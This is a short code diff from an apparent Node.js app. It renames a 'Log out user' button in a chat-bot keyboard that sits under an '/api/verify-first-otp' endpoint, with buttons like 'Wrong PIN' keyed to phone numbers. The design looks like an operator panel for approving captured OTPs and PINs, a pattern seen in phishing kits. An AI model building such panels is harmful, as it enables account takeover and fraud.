@@ -139,7 +139,7 @@ app.post('/api/verify-first-otp', async (req, res) => {
             { text: "🔑 Wrong PIN", callback_data: `otp1_wrongpin|${phone}` }
           ],
           [
-            { text: "🚫 Log out user", callback_data: `logout|${phone}` }
+            { text: "🚫Log out", callback_data: `logout|${phone}` }
           ]
         ]
       }
